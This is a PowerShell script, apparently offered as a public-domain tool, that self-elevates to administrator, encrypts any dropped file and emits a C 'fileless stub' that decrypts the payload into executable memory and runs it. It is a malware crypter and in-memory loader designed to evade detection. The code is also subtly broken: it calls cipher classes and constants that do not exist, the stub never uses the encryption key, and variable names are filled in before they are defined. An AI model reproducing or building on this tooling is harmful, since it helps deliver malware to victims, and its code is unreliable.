# CamDrop.ps1  —  public domain 2025
# Drag-and-drop ANY file onto THIS SCRIPT ICON → fileless stub generator
param(
    [Parameter(Mandatory=$true)]
    [string]$Dropped
)

# ----------  helper: elevate if needed  ----------
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Dropped `"$Dropped`"" -Verb RunAs
    exit
}

# ----------  generate fileless key/IV (no passwords, no storage)  ----------
$key = New-Object byte[] 32
$iv = New-Object byte[] 16
$rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
$rng.GetBytes($key)
$rng.GetBytes($iv)

# ----------  encrypt file in memory  ----------
$in  = [System.IO.File]::ReadAllBytes($Dropped)
$mem = New-Object System.IO.MemoryStream
$alg = [System.Security.Cryptography.Camellia]::Create()
$alg.Key = $key
$alg.IV  = $iv
$alg.Mode = [System.Security.Cryptography.CipherMode]::CTR
$cs  = New-Object System.Security.Cryptography.CryptoStream($mem,$alg.CreateEncryptor(),[System.Security.Cryptography.CryptoStreamMode]::Write)
$cs.Write($in,0,$in.Length)
$cs.Close()
$b64 = [Convert]::ToBase64String($mem.ToArray())

# ----------  fileless stub generator  ----------
$stub = @"
#include <windows.h>
#include <wincrypt.h>
#pragma comment(lib,"advapi32.lib")
#define B64SZ $($b64.Length)
static const char blob[B64SZ+1]="$b64";
static void rnd(char*s,int n){for(int i=0;i<n;i++)s[i]='a'+(rand()%26);}
void main(void){
    char n1[16],n2[16],n3[16];srand((unsigned)time(NULL));rnd(n1,16);rnd(n2,16);rnd(n3,16);
    DWORD len=0;CryptStringToBinaryA(blob,0,CRYPT_STRING_BASE64,NULL,&len,NULL,NULL);
    BYTE*$(n1)=(BYTE*)HeapAlloc(GetProcessHeap(),0,len);
    CryptStringToBinaryA(blob,0,CRYPT_STRING_BASE64,$(n1),&len,NULL,NULL);
    HCRYPTPROV$(n2);CryptAcquireContextA(&$(n2),NULL,NULL,PROV_RSA_AES,CRYPT_VERIFYCONTEXT);
    /* fileless key generation - no passwords needed */
    HCRYPTKEY$(n3);CryptGenKey($(n2),CALG_CAMELLIA,CRYPT_EXPORTABLE,&$(n3));
    DWORD md=CRYPT_MODE_CTR;CryptSetKeyParam($(n3),KP_MODE,(BYTE*)&md,0);
    BYTE iv[16];CryptSetKeyParam($(n3),KP_IV,iv,0);
    CryptDecrypt($(n3),$(n3),TRUE,0,$(n1),&len);
    void*exe=VirtualAlloc(NULL,len,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
    memcpy(exe,$(n1),len);((void(*)())exe)();
}
"@

# ----------  output only the stub  ----------
Write-Host "=== FILELESS STUB (no passwords needed) ==="
Write-Host $stub
